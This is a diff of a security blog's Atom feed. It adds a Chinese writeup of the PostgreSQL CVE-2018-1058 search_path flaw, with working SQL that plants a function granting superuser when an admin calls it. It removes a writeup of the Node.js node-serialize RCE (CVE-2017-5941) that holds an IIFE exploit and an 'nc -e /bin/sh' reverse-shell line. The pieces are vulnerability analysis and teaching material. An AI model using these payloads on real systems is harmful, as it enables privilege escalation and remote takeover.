@@ -216,6 +216,93 @@
   </entry>
   
   <entry>
+    <title>PostgreSQL 远程代码执行漏洞分析及利用—【CVE-2018-1058】</title>
+    <link href="http://chybeta.github.io/2018/03/06/PostgreSQL-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E2%80%94%E3%80%90CVE-2018-1058%E3%80%91/"/>
+    <id>http://chybeta.github.io/2018/03/06/PostgreSQL-远程代码执行漏洞分析及利用—【CVE-2018-1058】/</id>
+    <published>2018-03-06T08:38:54.000Z</published>
+    <updated>2018-03-06T08:41:56.773Z</updated>
+    
+    <content type="html"><![CDATA[<p>PostgreSQL 远程代码执行漏洞分析及利用—【CVE-2018-1058】<br><a id="more"></a></p>
+<p>首发于： <a href="https://xianzhi.aliyun.com/forum/topic/2109" target="_blank" rel="external">PostgreSQL 远程代码执行漏洞分析及利用—【CVE-2018-1058】 </a></p>
+<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306163548-5f2d7c64-2119-1.png" alt="14.png"></p>
+<p>A flaw was found in the way Postgresql allowed a user to modify the behavior of a query for other users. An attacker with a user account could use this flaw to execute code with the permissions of superuser in the database. Versions 9.3 through 10 are affected.</p>
+<p>漏洞影响版本：<a href="https://www.securityfocus.com/bid/103221" target="_blank" rel="external">https://www.securityfocus.com/bid/103221</a></p>
+<h1 id="基本环境搭建"><a href="#基本环境搭建" class="headerlink" title="基本环境搭建"></a>基本环境搭建</h1><p>PostgreSQL(win平台)下载地址： <a href="https://www.openscg.com/bigsql/oscg_download/?file=packages/PostgreSQL-9.6.7-1-win64-bigsql.exe&amp;user=${auth.authName}" target="_blank" rel="external">PostgreSQL-9.6.7</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ psql -U postgres</div><div class="line">postgres=# CREATE DATABASE evil;</div><div class="line">postgres=# CREATE USER chybeta WITH PASSWORD &apos;chybeta&apos;;</div><div class="line">CREATE ROLE</div><div class="line">postgres=# GRANT ALL PRIVILEGES ON DATABASE evil to chybeta;</div><div class="line">GRANT</div></pre></td></tr></table></figure>
+<p>基本环境如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">超级用户：postgres</div><div class="line">普通用户：chybeta</div><div class="line">数据库： evil</div></pre></td></tr></table></figure></p>
+<h1 id="漏洞分析-利用"><a href="#漏洞分析-利用" class="headerlink" title="漏洞分析/利用"></a>漏洞分析/利用</h1><h2 id="基本场景"><a href="#基本场景" class="headerlink" title="基本场景"></a>基本场景</h2><p>先看一些基本场景。普通用户chybeta登陆：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ psql -U chybeta -d evil</div></pre></td></tr></table></figure></p>
+<p>通过<code>SELECT SESSION_USER;</code>获知当前的会话用户：</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154523-53cb3552-2112-1.png" alt="1.png"></p>
+<p>我们在<code>public</code>模式中创建一张表以及对应的字段:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">evil=&gt;  </div><div class="line">SELECT 1</div></pre></td></tr></table></figure></p>
+<p>紧接着进行查询:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">evil=&gt; SELECT * FROM test;</div></pre></td></tr></table></figure></p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154543-5fd4b65c-2112-1.png" alt="2.png"></p>
+<p>接着我们新创建一个模式（schema），其模式名即为chybeta，也即当前的SESSION_USER：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">evil=&gt; CREATE schema chybeta;</div></pre></td></tr></table></figure></p>
+<p>然后在<code>chybeta</code>模式中创建对应的表以及字段:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">evil=&gt; CREATE TABLE chybeta.test AS SELECT &apos;i am chybeta&apos;::text AS test;</div></pre></td></tr></table></figure></p>
+<p>然后我们执行跟上次相同的查询语句:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">evil=&gt; SELECT * FROM test;</div></pre></td></tr></table></figure></p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154554-6659a8ca-2112-1.png" alt="3.png"></p>
+<p>为什么两次查询出现了不同的结果呢？这个涉及到PostgreSQL的<code>search_path</code>。PostgreSQL 7.3后引入了<code>schema</code>的概念，称之为模式或者架构，允许用户在独立的命名空间中创建不同的对象（比如table，function）。在默认情况下，比如刚刚创建的一个数据库，都会有默认的一个<code>public</code>模式，在不做其他操作或者设定的情况下，诸如查询等操作都是在这个<code>public</code>中进行查询。</p>
+<p>比如说:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM test;</div></pre></td></tr></table></figure></p>
+<p>也即等价于:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM public.test;</div></pre></td></tr></table></figure></p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154603-6b83748e-2112-1.png" alt="4.png"></p>
+<p>由于采用了独立的命名空间，因此在用户进行查询时，倘若涉及到对相同名字但在不同<code>schema</code>中的对象操作时，必然需要考虑一定的顺序。在PostgreSQL 9.6.7的官方文档中，<a href="https://docs.postgresql.fr/9.6/pg96.pdf" target="_blank" rel="external">search_path (string)</a>说明了相关场景中的相应匹配动作，截取部分如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">When there are objects of identical names in different schemas, the one found first in the search path is used.</div><div class="line"></div><div class="line">If one of the list items is the special name $user, then the schema having the name returned by SESSION_USER is substituted, if there is such a schema and the user has USAGE permission for it. (If not, $user is ignored.)</div><div class="line"></div><div class="line">The system catalog schema, pg_catalog, is always searched, whether it is mentioned in the path or not. If it is mentioned in the path then it will be searched in the specified order. If pg_catalog is not in the path then it will be searched before searching any of the path items.</div></pre></td></tr></table></figure></p>
+<p>即：</p>
+<ol>
+<li>首先适配原则，第一个找到的object被使用</li>
+<li>名为$user的schema由SESSION_USER决定</li>
+<li>如果<code>pg_catalog</code>不在path中则会最先查找它，如果在path中则按照指定顺序查找</li>
+</ol>
+<p>第1、2点即如前面所示，但PostgreSQL在对第3点的实现上出现了<code>Design Error</code>(securityfocus的分类)，造成了代码执行漏洞。</p>
+<h2 id="pwn-it"><a href="#pwn-it" class="headerlink" title="pwn it!"></a>pwn it!</h2><p>在系统schema<code>pg_catalog</code>中，定义了大量的函数，用pgAdmin3查看:</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154619-7531bdc4-2112-1.png" alt="5.png"></p>
+<p>以函数abs系列为例，接受一个类型为bigint\smallint\intger\real\double precision\numeric的参数，返回其绝对值。倘若我们传送一个非数值类型的参数呢，比如text，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">evil=&gt; select abs(&apos;chybeta&apos;);</div></pre></td></tr></table></figure></p>
+<p>由于并没有参数类型为text的abs函数，会直接报错：</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154641-82654d8a-2112-1.png" alt="6.png"></p>
+<p>但postgres提供了自定义函数的功能！我们创建如下函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CREATE FUNCTION public.abs(TEXT) RETURNS TEXT AS $$</div><div class="line">     SELECT &apos;you are hacked by &apos; || $1;</div><div class="line">$$ LANGUAGE SQL IMMUTABLE;</div></pre></td></tr></table></figure></p>
+<p>当我们再次执行同样的查询语句，根据postgres的设计流程，它会先去查找系统schema<code>pg_catalog</code>，但由于参数类型不同没有找到，接着按照<code>search_path</code>中的顺序查找，而我们定义的<code>abs(text)</code>存在于schema<code>public</code>中，参数符合，因此pg理所当然地执行了我们定义的函数:</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154646-85312ebc-2112-1.png" alt="7.png"></p>
+<p>注意一个点，这个函数是定义在schema<code>public</code>中的，也就是说对于进入到这个数据库的任何用户，只要他们调用了abs，且参数为text，都有可能会诱发恶意的代码执行。比如以超级用户postgres执行:</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154650-87c49ed4-2112-1.png" alt="8.png"></p>
+<p>不过有谁会傻乎乎的去运行一个莫名其妙的abs(text)呢？因此真正的攻击手段是将过程隐藏到看似正常的数据库查询中。这次我们选择schema<code>pg_catalog</code>中的另外一类函数比如lower(text)，upper(text)，它们分别将text类型的参数转成小写和大写，不过系统没有提供接受varchar参数的lower和upper，尽管可以进行类型转换，但对pg而言，最好的选择当然是参数类型恰好符合的恶意自定义函数。</p>
+<p>创建一个表，值的类型为varchar：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE public.hahahaha AS SELECT &apos;CHYBETA&apos;::varchar AS contents;</div></pre></td></tr></table></figure></p>
+<p>创建对应的恶意函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CREATE FUNCTION public.lower(varchar) RETURNS TEXT AS $$</div><div class="line">     SELECT &apos;you are hacked by &apos; || $1;</div><div class="line">$$ LANGUAGE SQL IMMUTABLE;</div></pre></td></tr></table></figure></p>
+<p>对绝大部分用户而言，他们可能看大写的<code>CHYBETA</code>不爽，然后执行了lower函数，但在不知道/清楚类型的情况下，他们执行的是public中的恶意自定义函数。</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154655-8ad49502-2112-1.png" alt="9.png"></p>
+<p>只能打印<code>you are hacked by XXX</code>有毛用！！由于恶意自定义函数可以被超级用户调用到，因此也就有了相应的执行权限，最简单的比如提权。</p>
+<p>先来看看权限情况（以超级用户为例），可以看到只有postgres的rolsuper是t，即true:</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154659-8d01e24e-2112-1.png" alt="10.png"></p>
+<p>在用户chybeta登陆进evil数据库后，他创建了如下<code>upper函数</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">CREATE FUNCTION public.upper(varchar) RETURNS TEXT AS $$</div><div class="line">    ALTER ROLE chybeta SUPERUSER;</div><div class="line">    SELECT pg_catalog.upper($1);</div><div class="line">$$ LANGUAGE SQL VOLATILE;</div></pre></td></tr></table></figure></p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154704-8fe68cf8-2112-1.png" alt="11.png"></p>
+<p>注意这里是<code>VOLATILE</code>，具体原因参考 <a href="https://www.postgresql.org/docs/8.2/static/xfunc-volatility.html" target="_blank" rel="external">官方文档:xfunc-volatility</a></p>
+<p>另外一张table，小写的chybeta:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE public.hehehehe AS SELECT &apos;chybeta&apos;::varchar AS contents;</div></pre></td></tr></table></figure></p>
+<p>管理员一看，心中不爽：小写小写就知道小写，然后:</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154709-92d5e288-2112-1.png" alt="12.png"></p>
+<p>看上去一切正常，大写的大写。回到用户chybeta处，查看一下权限:</p>
+<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180306154716-97501f40-2112-1.png" alt="13.png"></p>
+<p>已经成为超级用户。</p>
+<p>利用方法有很多，理论上只要能创建恶意函数，管理员调用，就是以管理员身份去执行恶意sql语句/代码。</p>
+<h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><p>以下版本修复了该漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PostgreSQL PostgreSQL 9.6.8 </div><div class="line">PostgreSQL PostgreSQL 9.5.12 </div><div class="line">PostgreSQL PostgreSQL 9.4.17 </div><div class="line">PostgreSQL PostgreSQL 9.3.22</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;PostgreSQL 远程代码执行漏洞分析及利用—【CVE-2018-1058】&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="PostgreSQL" scheme="http://chybeta.github.io/tags/PostgreSQL/"/>
+    
+      <category term="cve" scheme="http://chybeta.github.io/tags/cve/"/>
+    
+  </entry>
+  
+  <entry>
     <title>某CMS V5.7 SP2 后台Getshell</title>
     <link href="http://chybeta.github.io/2018/02/27/%E6%9F%90CMS-V5-7-SP2-%E5%90%8E%E5%8F%B0Getshell/"/>
     <id>http://chybeta.github.io/2018/02/27/某CMS-V5-7-SP2-后台Getshell/</id>
@@ -1377,59 +1464,6 @@ $output .= &quot;if ({$dec}) {\n&quot;;
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
     
       <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Node.js中的反序列化漏洞：CVE-2017-5941</title>
-    <link href="http://chybeta.github.io/2017/11/01/Node-js%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2017-5941/"/>
-    <id>http://chybeta.github.io/2017/11/01/Node-js中的反序列化漏洞：CVE-2017-5941/</id>
-    <published>2017-11-01T10:14:53.000Z</published>
-    <updated>2017-11-01T13:08:54.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>合上吧，水文一篇。<br>Node.js中的反序列化漏洞？<br>（Node.js：这锅我不背）<br><a id="more"></a></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>安装好node和npm后，安装一下主角node-serialize<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install node-serialize@0.0.4 --save</div></pre></td></tr></table></figure></p>
-<p>测试代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> chybeta = &#123;</div><div class="line">	<span class="attr">vuln</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'whoami'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>) </span>&#123;<span class="built_in">console</span>.log(stdout);&#125;);&#125;,</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">serResult = serialize.serialize(chybeta);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"serialize result:"</span>);</div><div class="line"><span class="built_in">console</span>.log(serResult+<span class="string">'\n'</span>);</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Direct unserialize:"</span>)</div><div class="line">serialize.unserialize(serResult);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"\n"</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Use IIFE to PWN it:"</span>)</div><div class="line">exp = serResult.substr(<span class="number">0</span>,serResult.length<span class="number">-2</span>) + <span class="string">"()"</span> + serResult.substr(<span class="number">-2</span>);</div><div class="line"><span class="built_in">console</span>.log(exp);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Exec whoami:"</span>)</div><div class="line">serialize.unserialize(exp);</div></pre></td></tr></table></figure></p>
-<p>运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">node index.js</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/5.png?raw=true" alt=""><br>可以看到执行了命令whoami</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="关于IIFE"><a href="#关于IIFE" class="headerlink" title="关于IIFE"></a>关于IIFE</h2><p>从运行截图来看，直接对序列化串进行反序列化，并不能导致远程命令执行，而是需要对序列化串进行修改。这里需要用到JS的IIFE(Immediately-Invoked Function Expression)，也即立即执行函数。这里简单的进行介绍。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/6.png?raw=true" alt=""></p>
-<p>前两种写法都是很正常的函数调用。</p>
-<p>而第三种<code>function(){console.log(&quot;Hello,chybeta three!&quot;)}();</code>，由于它直接以<code>function()</code>开头，js解释器默认情况下碰到function关键字时将其当作函数声明，而第三种写法缺少函数声明所必需的函数名。若要执行该函数，则必须显式地指定其为函数表达式。</p>
-<p>第四种写法<code>(function(){console.log(&quot;Hello,chybeta four!&quot;)}());</code>，则是常见的IIFE写法，js解释器在遇到<code>()</code>时，将其中的内容解释为函数表达式，而不是函数声明，因此得以执行。注意在<code>Hello,chybeta four!&quot;)}</code>的后面还有一对括号<code>()</code></p>
-<h2 id="node-serialize"><a href="#node-serialize" class="headerlink" title="node-serialize"></a>node-serialize</h2><p>在node-serialize的源码中，即node-serialize/lib/serialize.js，第59行开始，是对反序列(unserialize)的处理：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">exports.unserialize = <span class="function"><span class="keyword">function</span>(<span class="params">obj, originObj</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> isIndex;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj === <span class="string">'string'</span>) &#123;</div><div class="line">    obj = <span class="built_in">JSON</span>.parse(obj);</div><div class="line">    isIndex = <span class="literal">true</span>;</div><div class="line">  &#125;</div><div class="line">  originObj = originObj || obj;</div><div class="line"></div><div class="line">  <span class="keyword">var</span> circularTasks = [];</div><div class="line">  <span class="keyword">var</span> key;</div><div class="line">  <span class="keyword">for</span>(key <span class="keyword">in</span> obj) &#123;</div><div class="line">    <span class="keyword">if</span>(obj.hasOwnProperty(key)) &#123;</div><div class="line">      <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">'object'</span>) &#123;</div><div class="line">        obj[key] = exports.unserialize(obj[key], originObj);</div><div class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">'string'</span>) &#123;</div><div class="line">        <span class="keyword">if</span>(obj[key].indexOf(FUNCFLAG) === <span class="number">0</span>) &#123;</div><div class="line">          obj[key] = <span class="built_in">eval</span>(<span class="string">'('</span> + obj[key].substring(FUNCFLAG.length) + <span class="string">')'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(obj[key].indexOf(CIRCULARFLAG) === <span class="number">0</span>) &#123;</div><div class="line">          obj[key] = obj[key].substring(CIRCULARFLAG.length);</div><div class="line">          circularTasks.push(&#123;<span class="attr">obj</span>: obj, <span class="attr">key</span>: key&#125;);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">   .....</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>其中有一句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(&apos;(&apos; + obj[key].substring(FUNCFLAG.length) + &apos;)&apos;);</div></pre></td></tr></table></figure></p>
-<p>不妨在该句之前加上console.log：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">console.log(obj[key].substring(FUNCFLAG.length));</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/7.png?raw=true" alt=""></p>
-<p>执行<code>node index.js</code>，<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/8.png?raw=true" alt=""></p>
-<p>所以在进行eval时，实际进行的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval((function ()&#123;require(&apos;child_process&apos;).exec(&apos;whoami&apos;, function(error, stdout, stderr) &#123;console.log(stdout);&#125;);&#125;()));</div></pre></td></tr></table></figure></p>
-<p>后面的这对括号<code>()</code>，正是我们在修改原反序列化串时加上的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exp = serResult.substr(0,serResult.length-2) + &quot;()&quot; + serResult.substr(-2);</div></pre></td></tr></table></figure></p>
-<p>eval执行了该语句，从而造成了命令执行。</p>
-<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>将exec里的替换成反弹shell，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh xxx xxx</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/9.png?raw=true" alt=""></p>
-<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
-<li><a href="https://paper.seebug.org/213/" target="_blank" rel="external">利用 Node.js 反序列化漏洞远程执行代码</a></li>
-<li><a href="http://www.4hou.com/technology/3457.html" target="_blank" rel="external">NodeJS反序列化RCE漏洞的完美利用</a></li>
-</ul>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>无聊玩一玩。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;合上吧，水文一篇。&lt;br&gt;Node.js中的反序列化漏洞？&lt;br&gt;（Node.js：这锅我不背）&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-      <category term="Node.js" scheme="http://chybeta.github.io/tags/Node-js/"/>
-    
-      <category term="反序列化" scheme="http://chybeta.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     
   </entry>
   
